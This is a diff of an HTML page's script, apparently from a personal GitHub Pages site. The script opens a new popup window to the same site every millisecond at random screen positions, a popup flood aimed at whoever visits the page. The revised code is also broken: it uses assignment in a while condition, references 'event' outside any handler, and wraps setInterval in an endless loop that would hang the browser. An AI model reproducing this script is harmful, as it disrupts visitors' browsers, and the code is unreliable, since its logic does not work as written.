@@ -16,15 +16,19 @@ h8 {
 <script>
 	var newWindow;
 	var cat;
-	
-	setInterval(function(){
-	if (event.key === 'space')
-		var RandomX = (Math.random() * 1024) + 1;
-	        var RandomY = (Math.random() * 768) + 300;
-                var RandomY = (Math.random() * 768) + 1;
+	var A = 0
+	while (A = 0 )
+		if (event.key === 'space')
+			A = 1
+		
+	while (A == 0 )
+         setInterval(function(){
+	 	var RandomX = (Math.random() * 1024) + 1;
+	 	var RandomY = (Math.random() * 768) + 300;
+         	var RandomY = (Math.random() * 768) + 1;
 		var specs = "height=500px, width=500px, left=" + RandomX + ", top=" + RandomY;
-		newWindow = window.open("https://cassius-root.github.io","test", specs);
- 	}, 1);
+	 newWindow = window.open("https://cassius-root.github.io","test", specs);
+ 	 }, 1);
 </script>
 </body>
 </html>
